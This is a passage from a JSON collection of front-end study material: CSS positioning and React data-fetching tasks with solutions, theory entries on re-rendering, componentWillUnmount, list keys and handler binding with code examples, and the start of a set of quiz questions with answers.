some content to make the page scrollable.</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <div class=\"card\">\n            <h2>Product Card</h2>\n            <p>This is a product description.</p>\n            <div class=\"overlay\">\n                NEW!\n            </div>\n        </div>\n        <p>More content after the card.</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>End of content.</p>\n    </div>\n</body>\n</html>\n",
          "solutionCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Positioning Task Solution</title>\n    <style>\n        body {\n            margin: 0;\n            font-family: sans-serif;\n        }\n        .header {\n            background-color: #333;\n            color: white;\n            padding: 20px;\n            text-align: center;\n            font-size: 24px;\n            position: sticky; /* Make the header sticky */\n            top: 0; /* Stick to the top of the viewport */\n            z-index: 100; /* Ensure it stays on top of other content */\n        }\n        .content {\n            padding: 20px;\n            height: 180vh; /* Ensure enough height to scroll */\n            background-color: #e0e0e0;\n        }\n        .card {\n            width: 300px;\n            height: 200px;\n            background-color: #f0f0f0;\n            border: 1px solid #ccc;\n            margin: 50px auto;\n            padding: 20px;\n            position: relative; /* Crucial for absolute positioning of its children */\n            overflow: hidden; /* To keep the overlay inside if it goes beyond */\n        }\n        .overlay {\n            background-color: rgba(255, 0, 0, 0.7);\n            color: white;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 14px;\n            position: absolute; /* Positioned relative to the nearest positioned ancestor (.card) */\n            top: 20px; /* 20px from the top of the card */\n            right: 20px; /* 20px from the right of the card */\n            width: 60px;\n            height: 60px;\n            border-radius: 50%; /* Make it circular, optional */\n            font-weight: bold;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"header\">\n        Sticky Header\n    </div>\n    <div class=\"content\">\n        <p>Scroll down to see the sticky header in action.</p>\n        <p>This is some content to make the page scrollable.</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <div class=\"card\">\n            <h2>Product Card</h2>\n            <p>This is a product description.</p>\n            <div class=\"overlay\">\n                NEW!\n            </div>\n        </div>\n        <p>More content after the card.</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>More content...</p>\n        <p>End of content.</p>\n    </div>\n</body>\n</html>\n",
          "testCases": [
            "Initial view: Header should be at the top of the page.",
            "Scroll down: Header should stick to the top of the viewport and remain visible.",
            "Verify overlay: The 'NEW!' overlay should be positioned in the top-right corner of the 'Product Card', not the viewport or entire page.",
            "Check content flow: The 'Product Card' and other content should flow normally beneath the header and respect the space taken by `card`."
          ],
          "hints": [
            "For `position: sticky`, remember to also set a `top`, `bottom`, `left`, or `right` offset.",
            "For `position: absolute`, the parent element must have a `position` value other than `static` (e.g., `relative`, `absolute`, `fixed`, `sticky`) for the child to be positioned relative to it.",
            "Consider using `z-index` if elements are overlapping unexpectedly."
          ],
          "tags": [
            "CSS",
            "Positioning",
            "Layout",
            "Sticky",
            "Absolute"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "Basic HTML structure",
            "Understanding of CSS box model"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "position: sticky",
            "position: absolute",
            "position: relative",
            "viewport",
            "document flow"
          ]
        },
        {
          "id": "task_react_data_fetching_with_loading_error",
          "title": "Implement Data Fetching with Loading and Error States in React",
          "description": "\nYour task is to create a React class component that fetches data from a public API using `componentDidMount` and displays different UI states for loading, success, and error. The component should handle potential network issues and display appropriate messages.\n\n**Requirements:**\n1.  Create a class component named `UserProfileFetcher`.\n2.  Initialize its state to handle `loading` (boolean), `error` (Error object or null), and `userData` (object or null).\n3.  Perform an asynchronous data fetch request within `componentDidMount` using the `fetch` API. Use the placeholder API endpoint: `https://jsonplaceholder.typicode.com/users/1`.\n4.  Update the component's state based on the fetch outcome:\n    *   Set `loading` to `false` when the request completes.\n    *   If successful, set `userData` with the fetched data.\n    *   If an error occurs (e.g., network error, invalid response), set the `error` state.\n5.  In the `render` method, display:\n    *   \"Loading user data...\" when `loading` is `true`.\n    *   \"Error: [error message]\" when `error` is not `null`.\n    *   The user's name and email (from `userData`) when the fetch is successful.\n\n**Bonus:** Implement a simple retry mechanism or a button to re-fetch on error.\n",
          "difficulty": "medium",
          "startingCode": "import React, { Component } from 'react';\n\ninterface UserData {\n  id: number;\n  name: string;\n  email: string;\n  // ... other fields from JSONPlaceholder user\n}\n\ninterface UserProfileFetcherState {\n  loading: boolean;\n  error: Error | null;\n  userData: UserData | null;\n}\n\nclass UserProfileFetcher extends Component<{}, UserProfileFetcherState> {\n  constructor(props: {}) {\n    super(props);\n    this.state = {\n      loading: true,\n      error: null,\n      userData: null,\n    };\n  }\n\n  componentDidMount() {\n    // TODO: Implement data fetching logic here\n    // Use fetch('https://jsonplaceholder.typicode.com/users/1')\n    // Handle loading, success, and error states\n  }\n\n  render() {\n    const { loading, error, userData } = this.state;\n\n    // TODO: Implement UI rendering based on state\n    return (\n      <div>\n        <h2>User Profile</h2>\n        {/* Your conditional rendering logic goes here */}\n      </div>\n    );\n  }\n}\n\nexport default UserProfileFetcher;\n",
          "solutionCode": "import React, { Component } from 'react';\n\ninterface UserData {\n  id: number;\n  name: string;\n  email: string;\n  username: string;\n  address: any;\n  phone: string;\n  website: string;\n  company: any;\n}\n\ninterface UserProfileFetcherState {\n  loading: boolean;\n  error: Error | null;\n  userData: UserData | null;\n}\n\nclass UserProfileFetcher extends Component<{}, UserProfileFetcherState> {\n  constructor(props: {}) {\n    super(props);\n    this.state = {\n      loading: true,\n      error: null,\n      userData: null,\n    };\n  }\n\n  componentDidMount() {\n    this.fetchUserProfile();\n  }\n\n  fetchUserProfile = () => {\n    this.setState({ loading: true, error: null, userData: null }); // Reset state on retry\n    fetch('https://jsonplaceholder.typicode.com/users/1')\n      .then(response => {\n        if (!response.ok) {\n          // Throw an error for HTTP status codes that indicate failure\n          throw new Error(`HTTP error! Status: ${response.status}`);\n        }\n        return response.json();\n      })\n      .then((data: UserData) => {\n        this.setState({ userData: data, loading: false });\n      })\n      .catch(error => {\n        console.error('Error fetching user data:', error);\n        this.setState({ error: new Error(`Failed to fetch user data: ${error.message}`), loading: false });\n      });\n  };\n\n  render() {\n    const { loading, error, userData } = this.state;\n\n    return (\n      <div style={{ padding: '20px', border: '1px solid #eee', borderRadius: '8px', maxWidth: '400px', margin: '20px auto' }}>\n        <h2>User Profile</h2>\n        {loading && <p>Loading user data...</p>}\n\n        {error && (\n          <div style={{ color: 'red' }}>\n            <p>{error.message}</p>\n            <button onClick={this.fetchUserProfile}>Retry</button>\n          </div>\n        )}\n\n        {userData && !loading && !error && (\n          <div>\n            <h3>{userData.name}</h3>\n            <p><strong>Email:</strong> {userData.email}</p>\n            <p><strong>Username:</strong> {userData.username}</p>\n            <p><strong>Website:</strong> {userData.website}</p>\n          </div>\n        )}\n\n        {!loading && !error && !userData && <p>No user data available.</p>}\n      </div>\n    );\n  }\n}\n\nexport default UserProfileFetcher;\n",
          "testCases": [
            "Initial render: Component should display 'Loading user data...'.",
            "Successful fetch: After a short delay, the component should display the user's name and email (e.g., 'Leanne Graham', 'Sincere@april.biz'). `loading` state should be false, `error` should be null.",
            "Simulate network error (e.g., change URL to an invalid one): Component should display an error message and a 'Retry' button. `loading` should be false, `userData` should be null, `error` should be an Error object.",
            "Click 'Retry' button after an error: Component should attempt to re-fetch and return to loading or success state.",
            "Edge case: API returns empty or malformed data (conceptually, though not easily testable with JSONPlaceholder): The component should handle gracefully, ideally showing a 'no data' message or an error."
          ],
          "hints": [
            "Remember to use `setState` to update the component's state based on the fetch results.",
            "Always handle both the successful `then` and the `catch` block for errors in your `fetch` promise.",
            "The `response.ok` property of the `fetch` response indicates if the HTTP status is in the 200-299 range.",
            "Consider using conditional rendering (`&&` or ternary operator) in your `render` method to display different UI states."
          ],
          "tags": [
            "React",
            "Lifecycle",
            "Data Fetching",
            "AJAX",
            "Error Handling",
            "componentDidMount"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "React class components",
            "JavaScript Promises",
            "Fetch API"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "componentDidMount",
            "setState",
            "Fetch API",
            "Promises",
            "Conditional Rendering"
          ]
        }
      ]
    }
  },
  {
    "id": "78267e58-be43-481c-b514-df0c4e26f988",
    "startLine": 13800,
    "endLine": 13899,
    "processedDate": "2025-06-17T13:37:20.812Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_react_re_rendering",
          "title": "React Component Re-rendering Triggers and `forceUpdate`",
          "content": "In React, components re-render when their displayed output might need to change. This ensures the UI stays synchronized with the application's state and props. There are three primary reasons a class component will re-render:\n\n### 1. Changes in Props\nWhen a component receives new `props` from its parent, React detects this change and triggers a re-render of the component and its children. This is a fundamental mechanism for data flow in React applications.\n\n### 2. State Updates via `setState()`\nCalling `this.setState()` is the standard way to update a component's internal `state`. When `setState()` is called, React schedules a re-render. It then merges the new state into the current state and re-renders the component. This is the primary mechanism for managing dynamic data within a component.\n\n### 3. Explicit Re-render via `forceUpdate()`\nAs a last resort, `this.forceUpdate()` can be called to explicitly force a component to re-render. Unlike `setState()`, `forceUpdate()` will bypass the `shouldComponentUpdate()` lifecycle method for the component itself, meaning it will re-render even if `shouldComponentUpdate()` returns `false` or if no state or props have actually changed. However, it will still trigger the normal lifecycle methods for child components. This method should be used sparingly, as it circumvents React's optimized reconciliation process and can lead to performance issues if misused. It's typically reserved for situations where external, non-React controlled data changes require a UI update.\n",
          "examples": [
            {
              "id": "example_force_update_1",
              "title": "Using `forceUpdate` to Trigger Re-render",
              "code": "import React from 'react';\n\nclass ForceUpdateExample extends React.Component {\n  handleClick = () => {\n    // This will force a re-render regardless of whether state or props changed\n    this.forceUpdate();\n    console.log('Component was forcibly re-rendered');\n  }\n  \n  render() {\n    console.log('Render method called');\n    return (\n      <div>\n        <button onClick={this.handleClick}>Force Update</button>\n        <p>Current time: {new Date().toLocaleTimeString()}</p>\n      </div>\n    );\n  }\n}\n\n// To use this component:\n// ReactDOM.render(<ForceUpdateExample />, document.getElementById('root'));",
              "explanation": "This example demonstrates the `forceUpdate` method. Each time the button is clicked, `forceUpdate()` is called, which immediately triggers the `render()` method, updating the displayed time even though no state or props explicitly changed within the component itself. The console logs illustrate that `render` is indeed called.",
              "language": "typescript"
            },
            {
              "id": "example_state_props_re_render_2",
              "title": "Re-rendering via State and Props Changes",
              "code": "import React, { useState } from 'react';\n\n// Parent Component (changes props)\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n\n  const increment = () => setCount(prev => prev + 1);\n\n  console.log('ParentComponent rendered');\n\n  return (\n    <div>\n      <button onClick={increment}>Increment Count</button>\n      <ChildComponent count={count} />\n    </div>\n  );\n}\n\n// Child Component (re-renders on prop change)\nclass ChildComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { localValue: 0 };\n  }\n\n  handleLocalChange = () => {\n    this.setState(prevState => ({ localValue: prevState.localValue + 1 }));\n  };\n\n  render() {\n    console.log(`ChildComponent rendered. Props count: ${this.props.count}, Local value: ${this.state.localValue}`);\n    return (\n      <div>\n        <p>Prop from parent: {this.props.count}</p>\n        <p>Local state value: {this.state.localValue}</p>\n        <button onClick={this.handleLocalChange}>Change Local State</button>\n      </div>\n    );\n  }\n}\n\n// To use:\n// ReactDOM.render(<ParentComponent />, document.getElementById('root'));",
              "explanation": "This example showcases re-rendering due to prop and state changes. When the parent component's `count` state changes, it passes a new `count` prop to `ChildComponent`, causing the child to re-render. Additionally, when `ChildComponent`'s internal `localValue` state is updated via `this.setState()`, it triggers its own re-render, independent of the parent's props.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_re_render_1",
            "question_force_update_2",
            "question_force_update_3",
            "question_re_render_flashcard_4",
            "question_re_render_mcq_5"
          ],
          "relatedTasks": [
            "task_re_render_simulation"
          ],
          "tags": [
            "React",
            "re-render",
            "props",
            "state",
            "setState",
            "forceUpdate",
            "lifecycle"
          ],
          "technology": "React",
          "prerequisites": [
            "react_component_basics",
            "javascript_this_context"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_performance_optimization",
            "react_lifecycle_methods"
          ]
        },
        {
          "id": "theory_component_will_unmount",
          "title": "`componentWillUnmount` Lifecycle Method",
          "content": "`componentWillUnmount` is a lifecycle method in React class components that is invoked immediately before a component is unmounted and destroyed from the DOM. It is a critical method for performing cleanup operations to prevent memory leaks and ensure that your application behaves correctly when components are removed.\n\n### Why `componentWillUnmount` is Important:\n\nIt's the perfect place to:\n\n1.  **Remove Event Listeners**: If you added global event listeners (e.g., to `window`, `document`, or a specific DOM element) in `componentDidMount` or elsewhere, you must remove them here. Failure to do so can lead to memory leaks and unexpected behavior, as the listener might still try to access the unmounted component's methods or state.\n2.  **Cancel Network Requests**: If a component initiates network requests (e.g., API calls) in `componentDidMount` and the component unmounts before the request completes, you should cancel the request to prevent unnecessary state updates on an unmounted component, which can lead to warnings or errors.\n3.  **Clean Up Timers**: Any timers set using `setTimeout` or `setInterval` must be cleared in `componentWillUnmount`. If not cleared, they will continue to execute even after the component is gone, potentially causing errors or wasting resources.\n4.  **Unsubscribe from Subscriptions**: If the component subscribed to a data store, an observable, or any other external service (e.g., a Redux store, a WebSocket), it should unsubscribe in `componentWillUnmount` to prevent memory leaks and ensure the component doesn't react to updates after it's unmounted.\n\nFailing to perform these cleanup actions can lead to memory leaks, incorrect application behavior, and performance degradation over time.\n",
          "examples": [
            {
              "id": "example_cleanup_event_listener_1",
              "title": "Cleaning Up Event Listener",
              "code": "import React from 'react';\n\nclass ResizableComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { width: window.innerWidth, height: window.innerHeight };\n  }\n\n  componentDidMount() {\n    // Add event listener when component mounts\n    window.addEventListener('resize', this.handleResize);\n    console.log('Event listener added.');\n  }\n\n  componentWillUnmount() {\n    // Remove event listener when component unmounts\n    window.removeEventListener('resize', this.handleResize);\n    console.log('Event listener removed.');\n  }\n\n  handleResize = () => {\n    this.setState({\n      width: window.innerWidth,\n      height: window.innerHeight,\n    });\n  };\n\n  render() {\n    return (\n      <div>\n        <p>Window size: {this.state.width}x{this.state.height}</p>\n        <p>Resize your browser window to see changes.</p>\n      </div>\n    );\n  }\n}\n\n// To see componentWillUnmount in action, render this component conditionally\n// For example, toggle its presence in a parent component.",
              "explanation": "This example shows how to properly add and remove an event listener. The `handleResize` function is attached to the `window`'s `resize` event in `componentDidMount`. Crucially, it's removed in `componentWillUnmount` to prevent the listener from persisting and trying to update the state of a component that no longer exists in the DOM, which would cause a memory leak.",
              "language": "typescript"
            },
            {
              "id": "example_cleanup_timer_2",
              "title": "Cleaning Up a Timer",
              "code": "import React from 'react';\n\nclass TimerComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { seconds: 0 };\n    this.timerId = null; // To store the timer ID\n  }\n\n  componentDidMount() {\n    this.timerId = setInterval(() => {\n      this.setState(prevState => ({ seconds: prevState.seconds + 1 }));\n    }, 1000);\n    console.log('Timer started.');\n  }\n\n  componentWillUnmount() {\n    if (this.timerId) {\n      clearInterval(this.timerId);\n      console.log('Timer cleared.');\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <p>Seconds elapsed: {this.state.seconds}</p>\n        <p>This timer will stop when the component unmounts.</p>\n      </div>\n    );\n  }\n}\n\n// To demonstrate, render this component, then unmount it (e.g., navigate away or conditionally render false).",
              "explanation": "This example demonstrates cleaning up a `setInterval` timer. The timer is initiated in `componentDidMount` and its ID is stored. In `componentWillUnmount`, `clearInterval` is called with this ID, stopping the timer and preventing it from continuing to run in the background after the component is removed, thus avoiding resource waste and potential errors.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_component_will_unmount_1",
            "question_component_will_unmount_2",
            "question_component_will_unmount_3",
            "question_component_will_unmount_flashcard_4",
            "question_component_will_unmount_mcq_5"
          ],
          "relatedTasks": [
            "task_timer_cleanup",
            "task_event_listener_cleanup"
          ],
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "cleanup",
            "memory-leaks",
            "event-listeners",
            "timers",
            "subscriptions"
          ],
          "technology": "React",
          "prerequisites": [
            "react_lifecycle_basics",
            "javascript_timers",
            "javascript_event_listeners"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "robust_react_components",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_react_list_keys",
          "title": "Importance and Best Practices of Keys in React Lists",
          "content": "When rendering lists of elements in React, the `key` prop is a special string attribute you need to include for each item. Keys play a crucial role in React's reconciliation process, enabling it to efficiently update and manage list items.\n\n### Why Keys are Important:\nKeys help React identify which items have been changed, added, or removed from a list. When a list is updated, React uses keys to match existing list items with new ones in the virtual DOM. Without stable keys, React would struggle to determine precisely what changed, potentially leading to inefficient re-renders or incorrect component state.\n\nThis stability is crucial for React's reconciliation algorithm to work efficiently. When React processes a list with properly keyed items, it can efficiently update only the components that have changed instead of re-rendering the entire list or incorrectly re-using component instances.\n\n### Important Considerations for React Keys:\n\n1.  **Keys must be unique among siblings**: Two items in the *same* list (at the same level in the component tree) cannot have the same key. However, keys do not need to be globally unique across the entire application; they only need to be unique among their immediate siblings.\n2.  **Keys should be stable across renders**: A key should uniquely identify an item and should not change between renders unless the underlying item's identity truly changes (e.g., the item is deleted and a new one replaces it). If keys are unstable, React might re-create component instances unnecessarily, leading to performance issues and loss of internal component state (e.g., input values, scroll positions).\n3.  **Using index as keys can lead to problems**: While using an item's array index (`item, index) => <li key={index}>...</li>`) as a key might seem convenient, it's generally discouraged if:\n    *   The list items can be reordered.\n    *   Items can be added to or removed from the middle of the list.\n    *   Using index as a key in these scenarios can negatively affect performance, cause state issues (e.g., wrong item being updated), and potentially lead to bugs (e.g., incorrect data associated with a component).\n4.  **Unique Identifier from Data**: When iterating through data to create components, the key should ideally be a unique and stable identifier from your data source (like a database ID or a UUID). This ensures that each item has a consistent and distinct identity across renders.\n5.  **Keys are not passed as props**: Keys are used internally by React and are not accessible to the component itself via `this.props.key`. If you need the key value within your component, you should pass it as a separate prop (e.g., `<ListItem id={item.id} />`).\n",
          "examples": [
            {
              "id": "example_keys_correct_usage_1",
              "title": "Correct Key Usage with Unique IDs",
              "code": "import React from 'react';\n\nclass TodoList extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      todoItems: [\n        { uid: 'a1', task: 'Learn React' },\n        { uid: 'b2', task: 'Build a project' },\n        { uid: 'c3', task: 'Deploy application' },\n      ],\n    };\n  }\n\n  render() {\n    return (\n      <div>\n        <h2>My Todo List</h2>\n        <ul>\n          {this.state.todoItems.map(item => (\n            <li key={item.uid}>{item.task}</li>\n          ))}\n        </ul>\n      </div>\n    );\n  }\n}\n\n// Usage: ReactDOM.render(<TodoList />, document.getElementById('root'));",
              "explanation": "This example demonstrates the correct usage of keys. Each `todoItem` has a unique `uid` (a stable identifier from the data), which is used as the `key`. This allows React to efficiently update the list if items are reordered, added, or removed, preserving the internal state of list items and optimizing performance.",
              "language": "typescript"
            },
            {
              "id": "example_keys_incorrect_usage_2",
              "title": "Problematic Key Usage with Index",
              "code": "import React, { useState } from 'react';\n\nfunction BadKeyExample() {\n  const [items, setItems] = useState(['Apple', 'Banana', 'Cherry']);\n\n  const removeItem = (indexToRemove) => {\n    setItems(items.filter((_, index) => index !== indexToRemove));\n  };\n\n  const addItemAtStart = () => {\n    setItems(['New Fruit', ...items]);\n  };\n\n  return (\n    <div>\n      <h2>Fruit List (Bad Keys)</h2>\n      <button onClick={addItemAtStart}>Add Item at Start</button>\n      <ul>\n        {items.map((item, index) => (\n          // Using index as key - problematic if items change order or are removed/added\n          <li key={index}>\n            <input type=\"text\" defaultValue={item} />\n            <button onClick={() => removeItem(index)}>Remove</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n\n// Usage: ReactDOM.render(<BadKeyExample />, document.getElementById('root'));\n// Test by typing into inputs, then adding/removing items from the middle/start.",
              "explanation": "This example illustrates the problems of using array `index` as a key when the list order can change or items are added/removed. If you type text into the input fields and then add an item at the start or remove an item from the middle, you'll notice that the input values might 'jump' or become associated with the wrong items. This happens because React reuses the component instances based on their indices, which have shifted, rather than their stable identities. This leads to incorrect UI state and potential bugs.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_keys_1",
            "question_react_keys_2",
            "question_react_keys_3",
            "question_react_keys_flashcard_4",
            "question_react_keys_mcq_5"
          ],
          "relatedTasks": [
            "task_list_rendering_keys",
            "task_dynamic_list_keys"
          ],
          "tags": [
            "React",
            "keys",
            "lists",
            "reconciliation",
            "performance",
            "virtual-dom",
            "best-practices"
          ],
          "technology": "React",
          "prerequisites": [
            "react_component_rendering",
            "javascript_array_methods"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_performance_optimization",
            "react_advanced_concepts"
          ]
        },
        {
          "id": "theory_binding_event_handlers",
          "title": "Binding Event Handlers in React Class Components",
          "content": "In traditional JavaScript, the `this` context inside a function depends on how the function is called. When a class method is passed as an event handler (e.g., `onClick`, `onChange`), it often loses its `this` context, meaning `this` inside the method will be `undefined` or refer to the event target instead of the component instance.\n\n### Why Binding is Necessary:\nIn React class components, methods like `render`, `componentDidMount`, etc., are automatically bound to the component instance by React. However, custom methods that you define (like `handleClick`, `onInputChange`) are not automatically bound to `this` when they are passed as callbacks to event handlers. This means that inside such methods, `this` will be `undefined` by default when strict mode is enabled, or it will refer to the global object (in non-strict mode) or the element that triggered the event. This prevents you from accessing `this.state` or `this.props` or calling `this.setState()`.\n\nBinding methods to the component instance ensures that `this` inside the event handler always refers to the correct component instance, allowing you to safely access its `props`, `state`, and other methods.\n\n### Common Binding Approaches:\n\n1.  **Binding in the Constructor (Recommended for Class Components)**:\n    This is a common and efficient approach. You bind the method once in the constructor, and then it's always available with the correct `this` context. This avoids creating a new function on every render, which can be a performance concern.\n    ```javascript\n    class MyComponent extends React.Component {\n      constructor(props) {\n        super(props);\n        this.handleClick = this.handleClick.bind(this); // Binding here\n      }\n    \n      handleClick() {\n        console.log(this); // 'this' refers to the component instance\n        this.setState({ clicked: true });\n      }\n    \n      render() {\n        return <button onClick={this.handleClick}>Click me</button>;\n      }\n    }\n    ```\n\n2.  **Using Arrow Functions in Class Properties (Recommended)**:\n    This approach uses public class field syntax (part of ECMAScript but requires Babel for older environments). Arrow functions lexically bind `this`, so they automatically capture the `this` context of the class instance they are defined within. This is often the preferred way in modern React for its conciseness.\n    ```javascript\n    class MyComponent extends React.Component {\n      // handleClick is an arrow function class property\n      handleClick = () => {\n        console.log(this); // 'this' refers to the component instance\n        this.setState({ clicked: true });\n      }\n    \n      render() {\n        return <button onClick={this.handleClick}>Click me</button>;\n      }\n    }\n    ```\n\n3.  **Binding in the Render Method (Avoid for Performance)**:\n    You can bind the method directly in the render method using `bind` or an arrow function. However, this creates a *new function* on every render, which can negatively impact performance (especially for large lists or frequent re-renders) as React's reconciliation might struggle to optimize. It also makes `shouldComponentUpdate` less effective.\n    ```javascript\n    // Using .bind() in render (creates new function on each render)\n    <button onClick={this.handleClick.bind(this)}>Click me</button>\n\n    // Using arrow function in render (creates new function on each render)\n    <button onClick={() => this.handleClick()}>Click me</button>\n    ```\n\nUnderstanding `this` context and proper binding is fundamental for working with class components and handling user interactions effectively.\n",
          "examples": [
            {
              "id": "example_binding_constructor_1",
              "title": "Binding in Constructor",
              "code": "import React from 'react';\n\nclass InputHandler extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { data: '' };\n    // Binding the method in the constructor\n    this.onInputChange = this.onInputChange.bind(this);\n    console.log('Constructor: this.onInputChange is bound');\n  }\n\n  onInputChange(e) {\n    // 'this' refers to the component instance because it's bound\n    console.log('onInputChange: this is', this);\n    this.setState({ data: e.target.value });\n  }\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" onChange={this.onInputChange} value={this.state.data} />\n        <p>Input Value: {this.state.data}</p>\n      </div>\n    );\n  }\n}\n\n// Usage: ReactDOM.render(<InputHandler />, document.getElementById('root'));",
              "explanation": "This example demonstrates the recommended way to bind an event handler in a class component: in the constructor. By calling `this.onInputChange = this.onInputChange.bind(this);`, `onInputChange` is permanently bound to the component's `this` instance. This ensures that when `onInputChange` is called as a callback by React's event system, `this` inside the method correctly refers to the component, allowing `this.setState` to function as expected.",
              "language": "typescript"
            },
            {
              "id": "example_binding_class_property_2",
              "title": "Binding with Arrow Function Class Property",
              "code": "import React from 'react';\n\nclass Counter extends React.Component {\n  state = { count: 0 }; // Class property syntax for state\n\n  // Using an arrow function as a class property for the handler\n  // 'this' is lexically bound to the component instance\n  handleIncrement = () => {\n    console.log('handleIncrement: this is', this);\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  };\n\n  render() {\n    return (\n      <div>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.handleIncrement}>Increment</button>\n      </div>\n    );\n  }\n}\n\n// Usage: ReactDOM.render(<Counter />, document.getElementById('root'));",
              "explanation": "This example showcases using an arrow function as a class property, a modern and concise way to bind methods in React. The `handleIncrement` method is an arrow function, which inherently binds `this` to the instance of `Counter` where it's defined. This eliminates the need for explicit binding in the constructor and is generally preferred for its readability and ease of use.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_binding_handlers_1",
            "question_binding_handlers_2",
            "question_binding_handlers_3",
            "question_binding_handlers_flashcard_4",
            "question_binding_handlers_mcq_5"
          ],
          "relatedTasks": [
            "task_input_handler_binding",
            "task_event_handler_multiple_bindings"
          ],
          "tags": [
            "React",
            "event-handlers",
            "binding",
            "this-context",
            "class-components",
            "javascript",
            "ES6"
          ],
          "technology": "React",
          "prerequisites": [
            "javascript_this_context",
            "javascript_arrow_functions",
            "react_class_components"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_form_handling",
            "react_component_patterns"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_react_re_render_1",
          "topic": "React Component Re-rendering Triggers",
          "level": "easy",
          "type": "flashcard",
          "question": "List the three primary triggers for a React class component to re-render.",
          "answer": "1. Props change.\n2. State update (via `setState()`).\n3. Explicit call to `forceUpdate()`.",
          "options": [],
          "analysisPoints": [
            "Identifies the core mechanisms of React's update cycle.",
            "Distinguishes between data-driven updates (props, state) and explicit control (`forceUpdate`)."
          ],
          "keyConcepts": [
            "React re-rendering",
            "Props",
            "State",
            "setState()",
            "forceUpdate()"
          ],
          "evaluationCriteria": [
            "Ability to recall fundamental React concepts."
          ],
          "example": "",
          "tags": [
            "React",
            "re-render",
            "props",
            "state",
            "forceUpdate",
            "flashcard"
          ],
          "prerequisites": [
            "react_component_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_force_update_2",
          "topic": "`forceUpdate` Method in React",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React class component:\n\n```javascript\nclass MyComponent extends React.Component {\n  shouldComponentUpdate(nextProps, nextState) {\n    console.log('shouldComponentUpdate called');\n    return false; // Always prevent re-render\n  }\n\n  handleClick = () => {\n    this.forceUpdate();\n    console.log('Forcing update');\n  }\n\n  render() {\n    console.log('Render called');\n    return (\n      <div>\n        <button onClick={this.handleClick}>Force Render</button>\n      </div>\n    );\n  }\n}\n```\n\nIf the `Force Render` button is clicked, what will be logged to the console?",
          "answer": "Forcing update\nRender called",
          "options": [
            "Forcing update\nshouldComponentUpdate called\nRender called",
            "Forcing update\nRender called",
            "Forcing update",
            "shouldComponentUpdate called\nRender called"
          ],
          "analysisPoints": [
            "Tests understanding of `forceUpdate`'s behavior regarding `shouldComponentUpdate`.",
            "Highlights the explicit bypass nature of `forceUpdate`."
          ],
          "keyConcepts": [
            "forceUpdate()",
            "shouldComponentUpdate()",
            "React lifecycle",
            "Re-rendering"
          ],
          "evaluationCriteria": [
            "Understanding of React's reconciliation process.",
            "Knowledge of `forceUpdate`'s specific interaction with lifecycle methods."
          ],
          "example": "The key detail is that `forceUpdate()` skips `shouldComponentUpdate()` for the component itself. Therefore, 'shouldComponentUpdate called' will not be logged. `render()` will be called directly after `forceUpdate()` is invoked.",
          "tags": [
            "React",
            "forceUpdate",
            "shouldComponentUpdate",
            "lifecycle",
            "re-render",
            "mcq"
          ],
          "prerequisites": [
            "react_lifecycle_methods"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_force_update_3",
          "topic": "When to Use `forceUpdate`",
          "level": "hard",
          "type": "open",
          "question": "You have a React class component that displays data fetched from a third-party library, which manages its own internal data store and doesn't expose its changes through props or state. Explain a scenario where `this.forceUpdate()` might be a necessary, albeit less ideal, solution. Discuss the potential drawbacks of using `forceUpdate` in such a scenario and suggest alternative, more React-idiomatic approaches if possible.",
